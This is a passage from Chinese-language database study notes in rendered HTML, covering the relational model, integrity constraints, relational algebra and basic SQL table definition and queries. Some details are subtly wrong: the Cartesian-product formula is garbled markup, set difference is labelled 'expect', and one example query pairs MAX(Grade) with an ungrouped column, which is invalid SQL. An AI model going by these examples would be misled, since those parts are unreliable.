模式的映像作相应改变，可以使外模式保持不变。应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性</strong>。</p><h2 id="数据库技术的研究领域和发展趋势"><a class="markdownIt-Anchor" href="#数据库技术的研究领域和发展趋势">#</a> 数据库技术的研究领域和发展趋势</h2><p><strong>数据库技术和相关技术的相结合</strong></p><ul><li><strong>分布式</strong>数据库系统：数据库技术 + 分布式处理技术</li><li><strong>并行</strong>数据库系统：数据库技术 + 并行处理技术</li><li><strong>多媒体</strong>数据库系统：数据库技术 + 多媒体处理技术</li><li><strong>移动</strong>数据库系统：数据库技术 + 移动通信技术</li><li><strong>Web</strong> 数据库系统：数据库技术 + Web 技术</li><li><strong>自主</strong>数据库系统：数据库技术 + 人工智能技术</li></ul><h1 id="二关系数据库"><a class="markdownIt-Anchor" href="#二关系数据库">#</a> 二，关系数据库</h1><h3 id="关系"><a class="markdownIt-Anchor" href="#关系">#</a> 关系</h3><p>单一的数据结构 — 关系<br>逻辑结构 — 二维表<br><strong>关系模型是建立在集合代数的基础上的</strong><br><font color='red'>关系模型是用关系表示实体及其联系</font><br>关系 -&gt; 二维表</p><h4 id="概念"><a class="markdownIt-Anchor" href="#概念">#</a> 概念</h4><p><strong>1，域</strong><br>具有相同数据类型的值的集合。即属性的取值范围。<br><strong>2，笛卡尔积</strong><br>给定一组域<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">D_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">D_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">D_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">D_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> , 这些域的笛卡尔积为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">D_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>  × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">D_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ×…× <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">D_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> =<ruby>($d_1$,$d_2$,…,$d_n$)|$d_i$∈$D_i$,i=1,2,3,…,n} **3, 元组 **笛卡尔积中每一个元素乘坐一个 n 元组。表的每一行叫做一个元组。**4，分量 **元素中每一个值 $d_i$ 称做一个分量。**5，基数 **若 $D_i$ 为有限集，其基数为 $m_i$，则 $D_1$ × $D_2$ … $D_n$ 的基数为 M = $\prod_{i=1}<rp>【</rp><rt>{n</rt><rp>】</rp></ruby>$$m_i$</p><h4 id="码"><a class="markdownIt-Anchor" href="#码">#</a> 码</h4><ul><li>候选码：若关系中的某一属性组能唯一标识一个元组，而其子集不能，则称该属性组为候选码。</li><li>全码（ALL-key）：最极端的情况，关系模式的所有属性共同构成这个关系模式的候选码，称为全码。</li><li>主码：若一个关系有多个候选码，则选定一个作为主码（Primary key）。能够唯一标识一条记录的<strong>最小属性集</strong>。</li><li>主属性：候选码的诸个属性称为主属性</li><li>非主属性：不包含在任何候选码中的属性 （或者说非码属性）。</li></ul><h4 id="三类关系"><a class="markdownIt-Anchor" href="#三类关系">#</a> 三类关系</h4><ul><li>基本关系 (基本表)：实际存在的表，是实际存储数据的逻辑表示</li><li>查询表：查询结果对应的表</li><li>视图表：有基本表或者其他视图表导出的表，<strong>是虚表</strong>，不对应实际存储的数据。</li></ul><h4 id="关系模式"><a class="markdownIt-Anchor" href="#关系模式">#</a> 关系模式</h4><p>【定义】 是对关系的描述。关系模式是型，关系是值。 关系模式是静态的。<br>关系的形式化表示：R (U, D, dom, F)<br> R：关系名  U：组成该关系的属性集合  DOM：属性项域的映像集合 F：属性间的数据依赖关系集合</p><h4 id="关系数据库"><a class="markdownIt-Anchor" href="#关系数据库">#</a> 关系数据库</h4><p>一个给定的应用领域中，所有关系的集合构成一个关系数据库。</p><h3 id="关系的完整性"><a class="markdownIt-Anchor" href="#关系的完整性">#</a> 关系的完整性</h3><p>【定义】: <strong>关系模型中有三类完整性约束：实体完整性，参照完整性，用户定义的完整性。</strong><br><font color='green'>注意</font>: 为保证数据库中数据的正确性，通常定义完整性约束的方式是：存储过程，Check 约束，On Delete no Action。</p><h4 id="实体完整性"><a class="markdownIt-Anchor" href="#实体完整性">#</a> 实体完整性</h4><p>是指若属性 A 是基本关系 R 的主属性，则 A 不能取空值。<br><strong>实体完整性规则的说明:</strong><br>（1）主码不能为空值。（所有的主属性都不能取空值）<br>（2）两个元素的主码不能相同。</p><h4 id="参照完整性"><a class="markdownIt-Anchor" href="#参照完整性">#</a> 参照完整性</h4><p>这里介绍一下<strong>外码 / 外键</strong>。<br>定义：设 F 是基本关系 R 的一个或一组属性，但不是关系 R 的码。如果 F 与基本关系 S 的主码<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>K</mi><mi>s</mi></msub></mrow><annotation encoding="application/x-tex">K_s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 相对应，则称 F 是基本关系 S 的外码。 基本关系 R 为参照关系，基本关系 S 为被参照关系。<br><strong>参照完整性规则：</strong><br>对于 R 上每个元组在 F 上的取值：要么取空值，要么等于 S 中某个元组的主码值。<br>例如有如下两个关系：</p><ul><li>部门 (<u>部门号</u>，部门名，电话)</li><li>雇员 (<u>雇员号</u>，雇员名，职称，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><munder><mo><mtext>部门号</mtext></mo><mo lspace="0em" rspace="0em">∼</mo></munder></mi></mrow><annotation encoding="application/x-tex">\underset{\sim}{部门号}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.38333em;vertical-align:-0.7em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-2.4em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">∼</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord cjk_fallback">部门号</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7em;"><span></span></span></span></span></span></span></span></span></span>)<br> 这里得部门号即外码，可以取部门中部门号得取值或者空值。<br>值得注意的是，外键可能来自同一关系，也就是被参照关系就是参照关系。<br>Students(<u>sid</u>, name, login, age, gpa, <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><munder><mo><mi>p</mi><mi>a</mi><mi>r</mi><mi>t</mi><mi>n</mi><mi>e</mi><mi>r</mi></mo><mo lspace="0em" rspace="0em">∼</mo></munder></mi></mrow><annotation encoding="application/x-tex">\underset{\sim}{partner}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.50952em;vertical-align:-0.89444em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.61508em;"><span style="top:-2.20556em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mrel mtight">∼</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">t</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.89444em;"><span></span></span></span></span></span></span></span></span></span>), partner 是 对 sid 的一个外键约束，一个学生可能没有同伴，故其可以取空，相应的，对于课程，当一门课程没有前期课程时，preq 可以为空，空值并不违反外键约束</li></ul><h4 id="用户定义的完整性"><a class="markdownIt-Anchor" href="#用户定义的完整性">#</a> 用户定义的完整性</h4><p>这里就是自己对数据加上域，即添加约束。用户自定义完整性 1 针对某一具体关系数据库的约束条件，反映<strong>某一具体应用所涉及的数据必须满足的语义要求</strong>，例如某个属性必须取唯一值，某个非主属性不能取空值等等.</p><h3 id="关系代数"><a class="markdownIt-Anchor" href="#关系代数">#</a> 关系代数</h3><h4 id="传统的集合运算"><a class="markdownIt-Anchor" href="#传统的集合运算">#</a> 传统的集合运算</h4><p>注意这里默认 R 和 S 都有相同的目 n（都具有 n 个属性）<br><strong>1，并 (union)</strong><br> R 并 S，即在 R 也在 S 的元素集合<br><strong> 2，差 (expect)</strong><br> R 差 S，在 R 中而不在 S 中的元素的集合<br><strong> 3，交 (intersection)</strong><br> R 交 S，既属于 R 又属于 S 的元组组成。<br><strong>4，笛卡尔积</strong><br> R：n 目，k 个元组   S：m 目，t 个元组<br> R X S ：结果 行: k × t 个元组 列: (n+m) 个列</p><h4 id="专门的关系运算"><a class="markdownIt-Anchor" href="#专门的关系运算">#</a> 专门的关系运算</h4><p><strong>1，选择</strong><br>通过条件筛选来查询相应数据。例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>s</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo>&lt;</mo><mn>20</mn></mrow></msub></mrow><annotation encoding="application/x-tex">σ_{sage&lt;20}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span><span class="mord mathnormal mtight">e</span><span class="mrel mtight">&lt;</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>(student) 表示查询年龄小于 20 的学生。<br><strong>2，投影运算</strong><br>只从关系 R 中选取若干属性组成新的关系。例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mrow><mi>s</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>d</mi><mi>e</mi><mi>p</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\pi_{sname,sdept}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight">e</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，是只查询学生的姓名和所在系。<br><strong>3，连接运算</strong><br> R 和 S 进行连接运算的结果：从 R 和 S 的广义笛卡尔积 R × S 中选取 (R 关系) 在 A 属性组上的值与（S 关系）在 B 属性组上值满足关系 θ 的元组。</p><ul><li>等值连接：从关系 R 和 S 的广义笛卡尔积中找到 A 和 B 属性相等的那些元组。（A 和 B 可以不是同一个属性）。<strong>这里没有去掉重复列。</strong></li><li>自然连接：是一种特殊的等值连接，R 和 S 中具有相同属性组 B，<strong>在结果结果中把重复的属性列去掉</strong>。</li><li>外连接：悬浮元组的概念：R 和 S 在做自然连接时，R 中某些元组有可能在 S 中不存在公共属性上值相等的元组，就会造成 R 中这些元组在操作时被舍弃（反过来 S 也是这样）。<br><strong>4，除运算</strong><br>这里先给出<strong>象集</strong>的定义：当在 R 关系中属性 A 取 x 值时，其他属性例如 B 可以取什么值，这个取得值得集合称为 1 象集。<br>R÷S={tr [X]| tr∈R 并且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>π</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">\pi_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>(S)<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊆</mo></mrow><annotation encoding="application/x-tex">\subseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊆</span></span></span></span> Yx}<br> 那么 R 除 S，假设 R 中 得 B,C 属性 是 R 和 S 共同属性，那么就找 R 中哪个 A 得元素得象集能包含 S 中所有得 B，C 得取值得。</li></ul><h1 id="三关系数据库标准语言sql"><a class="markdownIt-Anchor" href="#三关系数据库标准语言sql">#</a> 三，关系数据库标准语言 SQL</h1><p><strong>语法说明:</strong></p><blockquote><p><strong>&lt;&gt;</strong>：尖括号用于分隔字符串<br><strong> []</strong>：方括号表示规则中的可选元素，可以选择也可以省略<br><strong> {}</strong>：花括号表示聚集规则中的元素，必须明确指定</p></blockquote><h4 id="1模式得定义和删除"><a class="markdownIt-Anchor" href="#1模式得定义和删除">#</a> 1，模式得定义和删除</h4><p>1，定义模式：CREATE SCHEMA &lt;模式名&gt; AUTHORIZATION &lt; 用户名 &gt;; 若没有指定模式名 则默认为用户名。<br>2，删除模式：DROP SCHEMA &lt;模式名&gt; &lt;CASCADE|RESTRICT&gt;;<br>①CASCADE 和 RESTRICT 必须二选一。<br>②CASCADE (级联删除)<br>③RESTRICT (限制删除)</p><h4 id="2基本表的定义删除和修改"><a class="markdownIt-Anchor" href="#2基本表的定义删除和修改">#</a> 2，基本表的定义，删除和修改</h4><p><strong>1, 创建基本表</strong><br> CREATE TABLE &lt;表名&gt; (&lt; 列名 &gt;&lt; 数据类型 &gt;[&lt; 列级完整性约束条件 &gt;][,&lt; 列名 &gt;&lt; 数据类型 &gt;[&lt; 列级完整性约束条件 &gt;]]…[,&lt; 表级完整性约束条件 &gt;]);</p><ul><li><strong>如果完整性约束条件涉及该表的多个属性列，则必须定义在表级上，否则既可以在列级上也可以在表级上</strong><br>【例 3】：建立学生选课表 <code>SC</code> ，其中 <code>Sno</code>  和 <code>Cno</code>  是外码，分别参照 <code>Student</code>  表的 <code>Sno</code>  列和 <code>Course</code>  表的 <code>Cno</code>  列</li><li><code>Sno</code>  和 <code>Cno</code>  是 <code>SC</code>  的主码，必须使用表级完整性定义</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE SC</span><br><span class="line">(</span><br><span class="line">Sno CHAR(9),</span><br><span class="line">Cno CHAR(4),</span><br><span class="line">Grade SMALLINT,</span><br><span class="line"></span><br><span class="line">PRIMARY KEY(Sno,Cno),//必须使用表级完整性定义</span><br><span class="line">FOREIGN KEY(Sno) REFERENCES Student(Sno),</span><br><span class="line">FOREIGN KEY(Cno) REFERENCES Course(Cno)</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2，修改基本表</strong><br><img src="https://img-blog.csdnimg.cn/ee787b17b1e44ecdb4361f8f76c1b841.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="修改"></p><ul><li><strong> <code>ADD</code> ：用于增加新列，新的列级完整性约束条件和新的表级完整性约束条件</strong></li><li><strong> <code>DROP COLUMN</code> ：用于删除表中的列</strong></li><li><strong> <code>DROP CONSTRAINT</code> ：用于删除指定的完整性约束条件</strong></li><li><strong> <code>ALTER COLUMN</code> ：用于修改原有的列定义</strong><br><strong>（3）删除基本表</strong><br><img src="https://img-blog.csdnimg.cn/fae55e92650e4bfa91e8ccc3a99de49c.png" alt="删除"></li><li><strong>选择 <code>RESTRICT</code> </strong>：欲删除的基本表不能被其他表的约束所引用（比如 CHECK、FOREIGN KEY 等）、不能有视图、不能有触发器（trigger），不能有存储过程或函数等</li><li><strong>选择 <code>CASCADE</code> </strong>：没有限制条件，所有相关依赖对象连同基本表一起删除<br><strong> 3，创建索引</strong><br><strong>作用：建立索引是加快查询速度的有效手段</strong> ： 数据库索引类似于图书后面的索引，能快速定位需要查询的内容。下面是索引的类型：</li><li>顺序文件上的索引</li><li>B + 树索引</li><li>散列索引</li><li>位图索引</li></ul><p><strong>（1）建立索引</strong><br><img src="https://img-blog.csdnimg.cn/dbd9b112a0054167bb3c84d78de6ce81.png" alt="索引"></p><ul><li>&lt;表名&gt;：要建立索引的基本表的名字</li><li>索引可以建立在该表的一列或多列上，各列之间使用逗号分隔</li><li>每个 &lt;列名&gt; 后面还可以用 &lt; 次序 &gt; 指定索引值的排列次序，可选 ASC - 升序（默认）或 DESC - 降序</li><li>UNIQUE：表明此索引的每一个索引值只对应唯一的数据记录</li><li>CLUSTER：表示需要建立聚簇索引 - 一个基本表只能有一个聚簇索引，最快的，但应该在查询多而修改少的表中建立（第七章会讲到）<br><strong>（2）修改索引</strong><br> ALTER INDEX &lt;旧索引名&gt; RENAME TO &lt; 新索引名 &gt;;<br><strong>（3）删除索引</strong><br> DROP INDEX &lt;索引名&gt;;</li></ul><h5 id="span-idlable附加数据字典span"><a class="markdownIt-Anchor" href="#span-idlable附加数据字典span">#</a> <span id="lable">附加：数据字典</span></h5><p>这里提一下一个概念，数据字典。</p><ul><li>关系数据库管理系统内部的一组系统表。</li><li>记录了数据库所有的<strong>表定义信息</strong>，包括<strong>模式定义，视图定义</strong>，<strong>索引定义</strong>，<strong>完整性约束定义</strong>，<strong>各类用户对数据库的操作权限</strong>，<strong>统计信息</strong>等。</li><li>RDBMS 执行 SQL 数据定义时，实际上就是更新数据字典。****</li></ul><h3 id="基本表的查询"><a class="markdownIt-Anchor" href="#基本表的查询">#</a> 基本表的查询</h3><p><strong>SELECT 语句含义：根据 WHERE 子句的条件表达式从 FROM 子句指定的表、视图中找出满足条件的元组，再按照 SELECT 子句中的目标列表达式选出元组中的属性值形成结果表。如果有：</strong></p><ul><li><strong>GROUP BY：结果按 &lt;列名 1&gt; 的值进行分组，该属性列值相等的元组为一个组；通常会在每组中作用聚集函数；如果该子句还携带 HAVING 短语，则只有满足指定条件的组才予以输出</strong></li><li><strong>ORDER BY：结果表还要按 &lt;列名 2&gt; 的值的升序或降序排序</strong><br><img src="https://img-blog.csdnimg.cn/fbe8bc8bf0624ef7b2f367769c4a0b4e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="select语句"></li></ul><h4 id="一单表查询"><a class="markdownIt-Anchor" href="#一单表查询">#</a> 一，单表查询</h4><p><strong>（1）查询若干列</strong><br> A：查询指定列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sname,Sage from Student;</span><br></pre></td></tr></table></figure><p>B：查询全部列 使用 * 来查询全部列<br> C：查询经过计算的值 可以利用算术表达式<br><strong>（2）查询若干行</strong><br> A：消除取值重复的行（DISTINCT）<br><strong>语法：前面说过投影操作可能会导致相同的行出现所以其结果必须消除重复行。可以使用 <code>DISTINCT</code>  消除</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT Sno from SC;</span><br></pre></td></tr></table></figure><p>B：查询满足条件的元组<br>通过 WHERE 语句实现，常见的查询条件如下：<br><img src="https://img-blog.csdnimg.cn/a3c32c0cd68a43fe8ec27a5be039c2fa.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="查询条件"><br>这里用 like 进行字符匹配时有两个通配符</p><blockquote><p>%： 任意长度的字符串。例如: A% b ----------- acb,addgb,ab,…<br>_  ：任意单个字符。例如 a_b ----------- acb,adb,…</p></blockquote><p>这里还要注意一下转义字符： <code>\</code>  这个字符用来转移_ 和 % 例如查询 DB_DESIGN，查询时需要用  <code>LIKE 'DB\_DESIGN'</code>  防止_自动识别任意字符。<br><strong>（3）ORDER BY 语句</strong><br><strong>语法：ORDER BY 子句对查询结果按照一个或多个属性列进行排序</strong></p><ul><li>ASC - 升序（默认）</li><li>DESC - 降序<br>这里给一个例子：查询选修了 3 号课程的学生的学号及其成绩，查询结果按分数降序排列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,Grade</span><br><span class="line">from SC</span><br><span class="line">WHERE Cno=&#x27;3&#x27;</span><br><span class="line">ORDER BY Grade DESC;   --降序排列</span><br></pre></td></tr></table></figure><p><strong>（4）聚集函数</strong><br><img src="https://img-blog.csdnimg.cn/03b2cab78c434dafb90f6accf809a5a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5b-r5LmQ5rGf5rmW,size_20,color_FFFFFF,t_70,g_se,x_16" alt="语法如下"><br>这里只给出一个例子：查询选修 2 号课程的学生最高分数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT Sno,MAX(Grade)</span><br><span class="line">FROM SC </span><br><span class="line">WHERE Cno=&#x27;2&#x27;;</span><br></pre></td></tr></table></figure><p><strong>（5）GROUP BY 子句</strong><br><strong>语法：GROUP BY 子句将查询结果按某一列或多列的值分组，值相等的分为一组</strong></p><ul><li>分组目的是为了<strong>细化聚集函数的作用对象：若未分组，聚集函数将会作用于整个查询结果；若分组，聚集函数将会作用于每一个组，也即每一个组都有一个函数值</strong></li><li>需要注意：<strong>WHERE 子句作用于整个表或视图，从中选择出满足条件的元组；HAVING 短语作用于组，从中选择满足条件的组</strong><br>这里举出一个例子说明 